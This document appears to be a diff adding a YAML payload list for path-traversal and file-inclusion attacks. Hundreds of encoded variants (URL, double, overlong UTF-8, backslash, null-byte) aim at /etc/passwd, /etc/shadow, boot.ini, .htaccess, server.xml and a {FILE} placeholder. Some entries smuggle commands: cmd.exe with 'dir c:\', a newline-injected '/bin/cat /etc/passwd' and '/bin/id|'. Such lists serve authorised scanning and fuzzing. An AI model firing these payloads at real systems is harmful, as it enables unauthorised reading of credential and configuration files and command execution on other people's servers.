+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c'
+- '%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c'
+- '%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c'
+- ../../../../../../../../../etc/passwd
+- ../../../../../../../../etc/passwd
+- ../../../../../../../etc/passwd
+- ../../../../../../etc/passwd
+- ../../../../../etc/passwd
+- ../../../../etc/passwd
+- ../../../etc/passwd
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34'
+- ../../../.htaccess
+- ../../.htaccess
+- ../.htaccess
+- .htaccess
+- ././.htaccess
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73'
+- '%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73'
+- '%2e%2e%2f%2e%68%74%61%63%63%65%73%73'
+- '%2e%68%74%61%63%63%65%73%73'
+- '%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33'
+- '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33'
+- '%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33'
+- '%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33'
+- '%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33'
+- ../../../../../../../../../../../../etc/hosts%00
+- ../../../../../../../../../../../../etc/hosts
+- ../../boot.ini
+- /../../../../../../../../%2A
+- ../../../../../../../../../../../../etc/passwd%00
+- ../../../../../../../../../../../../etc/passwd
+- ../../../../../../../../../../../../etc/shadow%00
+- ../../../../../../../../../../../../etc/shadow
+- /../../../../../../../../../../etc/passwd^^
+- /../../../../../../../../../../etc/shadow^^
+- /../../../../../../../../../../etc/passwd
+- /../../../../../../../../../../etc/shadow
+- /./././././././././././etc/passwd
+- /./././././././././././etc/shadow
+- \..\..\..\..\..\..\..\..\..\..\etc\passwd
+- \..\..\..\..\..\..\..\..\..\..\etc\shadow
+- ..\..\..\..\..\..\..\..\..\..\etc\passwd
+- ..\..\..\..\..\..\..\..\..\..\etc\shadow
+- /..\../..\../..\../..\../..\../..\../etc/passwd
+- /..\../..\../..\../..\../..\../..\../etc/shadow
+- .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+- .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+- \..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+- \..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+- ..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+- ..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+- '%0a/bin/cat%20/etc/passwd'
+- '%0a/bin/cat%20/etc/shadow'
+- '%00/etc/passwd%00'
+- '%00/etc/shadow%00'
+- '%00../../../../../../etc/passwd'
+- '%00../../../../../../etc/shadow'
+- /../../../../../../../../../../../etc/passwd%00.jpg
+- /../../../../../../../../../../../etc/passwd%00.html
+- /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+- /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+- /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+- /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+- '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00'
+- /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+- '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%'
+- /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+- \\&apos;/bin/cat%20/etc/passwd\\&apos;
+- \\&apos;/bin/cat%20/etc/shadow\\&apos;
+- ../../../../../../../../conf/server.xml
+- /../../../../../../../../bin/id|
+- C:/inetpub/wwwroot/global.asa
+- C:\inetpub\wwwroot\global.asa
+- C:/boot.ini
+- C:\boot.ini
+- ../../../../../../../../../../../../localstart.asp%00
+- ../../../../../../../../../../../../localstart.asp
+- ../../../../../../../../../../../../boot.ini%00
+- ../../../../../../../../../../../../boot.ini
+- /./././././././././././boot.ini
+- /../../../../../../../../../../../boot.ini%00
+- /../../../../../../../../../../../boot.ini
+- /..\../..\../..\../..\../..\../..\../boot.ini
+- /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+- \..\..\..\..\..\..\..\..\..\..\boot.ini
+- ..\..\..\..\..\..\..\..\..\..\boot.ini%00
+- ..\..\..\..\..\..\..\..\..\..\boot.ini
+- /../../../../../../../../../../../boot.ini%00.html
+- /../../../../../../../../../../../boot.ini%00.jpg
+- /.../.../.../.../.../
+- ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+- /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+- /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+- /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+- /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+- /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+- /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+- /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+- /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+- /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+- ../{FILE}
+- ../../{FILE}
+- ../../../{FILE}
+- ../../../../{FILE}
+- ../../../../../{FILE}
+- ../../../../../../{FILE}
+- ../../../../../../../{FILE}
+- ../../../../../../../../{FILE}
+- ..;/{FILE}
+- ..;/..;/{FILE}
+- ..;/..;/..;/{FILE}
+- ..;/..;/..;/..;/{FILE}
+- ..;/..;/..;/..;/..;/{FILE}
+- ..;/..;/..;/..;/..;/..;/{FILE}
+- ..;/..;/..;/..;/..;/..;/..;/{FILE}
+- ..;/..;/..;/..;/..;/..;/..;/..;/{FILE}
+- ..%2f{FILE}
+- ..%2f..%2f{FILE}
+- ..%2f..%2f..%2f{FILE}
+- ..%2f..%2f..%2f..%2f{FILE}
+- ..%2f..%2f..%2f..%2f..%2f{FILE}
+- ..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
+- ..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
+- ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
+- '%2e%2e/{FILE}'
+- '%2e%2e/%2e%2e/{FILE}'
+- '%2e%2e/%2e%2e/%2e%2e/{FILE}'
+- '%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}'
+- '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}'
+- '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}'
+- '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}'
+- '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}'
+- '%2e%2e%2f{FILE}'
+- '%2e%2e%2f%2e%2e%2f{FILE}'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}'
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}'
+- ..%252f{FILE}
+- ..%252f..%252f{FILE}
+- ..%252f..%252f..%252f{FILE}
+- ..%252f..%252f..%252f..%252f{FILE}
+- ..%252f..%252f..%252f..%252f..%252f{FILE}
+- ..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
+- ..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
+- ..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
+- '%252e%252e/{FILE}'
+- '%252e%252e/%252e%252e/{FILE}'
+- '%252e%252e/%252e%252e/%252e%252e/{FILE}'
+- '%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}'
+- '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}'
+- '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}'
+- '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}'
+- '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}'
+- '%252e%252e%252f{FILE}'
+- '%252e%252e%252f%252e%252e%252f{FILE}'
+- '%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}'
+- '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}'
+- '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}'
+- '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}'
+- '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}'
+- '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}'
+- ..\{FILE}
+- ..\..\{FILE}
+- ..\..\..\{FILE}
+- ..\..\..\..\{FILE}
+- ..\..\..\..\..\{FILE}
+- ..\..\..\..\..\..\{FILE}
+- ..\..\..\..\..\..\..\{FILE}
+- ..\..\..\..\..\..\..\..\{FILE}
+- ..%255c{FILE}
+- ..%255c..%255c{FILE}
+- ..%255c..%255c..%255c{FILE}
+- ..%255c..%255c..%255c..%255c{FILE}
+- ..%255c..%255c..%255c..%255c..%255c{FILE}
+- ..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
+- ..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
+- ..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
+- ..%5c..%5c{FILE}
+- ..%5c..%5c..%5c{FILE}
+- ..%5c..%5c..%5c..%5c{FILE}
+- ..%5c..%5c..%5c..%5c..%5c{FILE}
+- ..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
+- ..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
+- ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
+- '%2e%2e\{FILE}'
+- '%2e%2e\%2e%2e\{FILE}'
+- '%2e%2e\%2e%2e\%2e%2e\{FILE}'
+- '%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}'
+- '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}'
+- '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}'
+- '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}'
+- '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}'
+- '%2e%2e%5c{FILE}'
+- '%2e%2e%5c%2e%2e%5c{FILE}'
+- '%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}'
+- '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}'
+- '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}'
+- '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}'
+- '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}'
+- '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}'
+- '%252e%252e\{FILE}'
+- '%252e%252e\%252e%252e\{FILE}'
+- '%252e%252e\%252e%252e\%252e%252e\{FILE}'
+- '%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}'
+- '%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}'
+- '%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}'
+- '%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}'
+- '%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}'
+- '%252e%252e%255c{FILE}'
+- '%252e%252e%255c%252e%252e%255c{FILE}'
+- '%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}'
+- '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}'
+- '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}'
+- '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}'
+- '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}'
+- '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}'
+- ..%c0%af{FILE}
+- ..%c0%af..%c0%af{FILE}
+- ..%c0%af..%c0%af..%c0%af{FILE}
+- ..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
+- ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
+- ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
+- ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
+- ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
+- '%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}'
+- '%c0%ae%c0%ae%c0%af{FILE}'
+- '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}'
+- '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}'
+- '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}'
+- '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}'
+- '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}'
+- '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}'
+- '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}'
+- ..%25c0%25af{FILE}
+- ..%25c0%25af..%25c0%25af{FILE}
+- ..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
+- ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
+- ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
+- ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
+- ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
+- ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
+- '%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- '%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}'
+- ..%c1%9c{FILE}
+- ..%c1%9c..%c1%9c{FILE}
+- ..%c1%9c..%c1%9c..%c1%9c{FILE}
+- ..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
+- ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
+- ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
+- ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
+- ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
+- '%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}'
+- '%c0%ae%c0%ae%c1%9c{FILE}'
+- '%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}'
+- '%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}'
+- '%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}'
+- '%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}'
+- '%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}'
+- '%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}'
+- '%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}'
+- ..%25c1%259c{FILE}
+- ..%25c1%259c..%25c1%259c{FILE}
+- ..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
+- ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
+- ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
+- ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
+- ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
+- ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
+- '%25c0%25ae%25c0%25ae\{FILE}'
+- '%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}'
+- '%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}'
+- '%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}'
+- '%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}'
